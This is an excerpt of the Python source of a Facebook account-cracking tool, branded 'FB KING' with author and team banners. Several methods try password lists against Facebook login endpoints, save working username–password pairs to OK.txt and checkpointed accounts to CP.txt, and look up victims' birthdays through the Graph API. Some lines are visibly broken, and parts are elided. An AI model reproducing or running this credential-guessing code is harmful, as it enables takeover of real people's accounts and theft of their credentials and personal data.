...
def readline___Public_Xml():
	...
	print(" \033[1;94m[2] Create Supper File [ Unlamented ](ami banan parina)")
	...
	if key in [""]:
		...
		time.sleep(0.5)
		print (" [•] Search : Fb Search / Abal Mahin Ahmed")
	elif key in ["0", "00"]:
		exit("\n [✓] ami IMTIAZ AKING er pa chata kutt4♥️\n")
	else:
		exit()
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			print('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			print(' [1] FB KING Method 1 ')
			print(' [2] FB KING Method 2  [ Pro ]')
			print(' [3] FB KING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [ami abal MAHIN 😪] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				print('\r\033[1;92m[Successful-FB KING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					print('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[Checkpoint-baler FB KING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [baler FB KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Successful-FB KING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].print('\r\033[1;91m[Checkpoint-FB KING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
					...
					pass
				print('\r\033[1;91m[Checkpoint-FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;92m[Successful-FB KING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					pass
				print('\r\033[1;91m[Checkpoint-abal FB KING] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[94m
                     ...
                     _   __  __       _     _                  _           _ 
     /\             (_) |  \/  |     | |   (_)           /\   | |         | |
\033[1;97m    /  \   _ __ ___  _  | \  / | __ _| |__  _ _ __      /  \  | |__   __ _| |
\033[1;93m   / /\ \ | '_ ` _ \| | | |\/| |/ _` | '_ \| | '_ \    / /\ \ | '_ \ / _` | |
\033[1;92m  / ____ \| | | | | | | | |  | | (_| | | | | | | | |  / ____ \| |_) | (_| | |
\033[1;91m /_/    \_\_| |_| |_|_| |_|  |_|\__,_|_| |_|_|_| |_| /_/    \_\_.__/ \__,_|_|
                                                               

 [*]=============================================
    Author           :  \033[1;93mAbal MAHIN AHMED
    \033[1;92mFacebook.        : https://www.facebook.com/baler.FB.King.Abal.Mahin
    \033[1;94mTeam             : Black Mafia  orufe chaddi khing👿👈
    \033[1;93m❤ U Hetars       : Abal FB KING.banan parina
 [*]=============================================
   \033[1;31m  Use (Flight) Airplane Mod For Speed Up.banan vul hoice karon ami osikkhito \033[1;37m
 [*]============================================="""
ct = datetime.now()
n = ct.month
...
def dupcutter():
	os.system("xdg-open https://www.facebook.com/black.mafia.amar.baler.mafia/?ref=share")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
	os.system("xdg-open https://www.facebook.com/ami.abal.khing.mahin.spemper")
	time.sleep(3)
	readline___Public_Xml()
